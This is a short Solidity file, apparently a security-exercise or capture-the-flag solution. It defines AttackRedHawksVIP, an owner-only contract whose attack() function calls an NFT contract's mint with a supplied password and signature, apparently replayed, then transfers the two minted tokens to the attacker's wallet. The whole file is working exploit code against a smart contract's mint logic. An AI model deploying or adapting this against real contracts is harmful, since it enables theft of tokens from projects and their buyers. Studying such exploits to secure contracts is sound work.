//SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;
import "@openzeppelin/contracts/access/Ownable.sol";

interface IRedHawksVIP {
    function mint(
        uint16 amountOfTickets,
        string memory password,
        bytes memory signature
    ) external;

    function MAX_SUPPLY() external returns (uint16);

    function currentSupply() external returns (uint16);

    function transferFrom(address from, address to, uint256 tokenId) external;
}

contract AttackRedHawksVIP is Ownable {
    address immutable redHawks;

    constructor(address _redHawks) {
        redHawks = _redHawks;
    }

    function attack(
        uint16 i,
        uint16 j,
        string memory pass,
        bytes memory sig
    ) public onlyOwner {
        IRedHawksVIP(redHawks).mint(2, pass, sig);
        IRedHawksVIP(redHawks).transferFrom(address(this), owner(), i + j);
        IRedHawksVIP(redHawks).transferFrom(address(this), owner(), i + j + 1);
    }
}
